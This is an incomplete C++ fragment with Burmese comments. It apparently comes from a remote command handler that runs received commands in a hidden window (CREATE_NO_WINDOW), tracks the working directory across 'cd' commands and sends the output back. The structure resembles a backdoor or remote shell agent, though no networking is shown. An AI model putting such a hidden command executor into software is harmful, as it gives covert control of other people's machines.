...
void ExecuteAndSend(std::string cmd, std::string cid) {
    // 1. User က လမ်းကြောင်းပြောင်းဖို့ (ဥပမာ - cd D:\ သို့မဟုတ် cd ..) ရိုက်လိုက်တာလား စစ်ဆေးခြင်း
    // တကယ်လို့ cd ပါလာရင် path ကို တွက်ချက်ဖို့ command ပေါင်းမယ်
    std::string fullCmd;
    
    // အကယ်၍ user က cd command သီးသန့်ဖြစ်နေရင် current_path ကို ချက်ချင်း ပြောင်းပေးဖို့
    if (cmd.rfind("cd ", 0) == 0 || cmd.rfind("CD ", 0) == 0) {
        // ဥပမာ - cd D:\ လို့ ပို့လိုက်ရင် current_path ကို ချိန်ညှိဖို့ command တည်ဆောက်မယ်
        fullCmd = "cd /d \"" + current_path + "\" && " + cmd + " && cd";
    } else {
        // သာမန် command တွေအတွက် (ဥပမာ - dir, ipconfig)
    ...
    if (CreateProcessA(NULL, (LPSTR)execCmd.c_str(), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        ...
        // အကယ်၍ command က cd ဖြစ်နေရင် ထွက်လာတဲ့ နောက်ဆုံး path ကို current_path အဖြစ် အပ်ဒိတ်လုပ်မည်
        if (cmd.rfind("cd ", 0) == 0 || cmd.rfind("CD ", 0) == 0) {
            // chunk ထဲက နောက်ဆုံး newline တွေကို ရှင်းထုတ်ပြီး path အသစ်ကို ယူမယ်
            ...
            if (lastNewline != std::string::npos) {
                ...
                // တကယ်လို့ path အသစ်က တရားဝင်ဖြစ်ရင် current_path ကို ပြောင်းမယ်
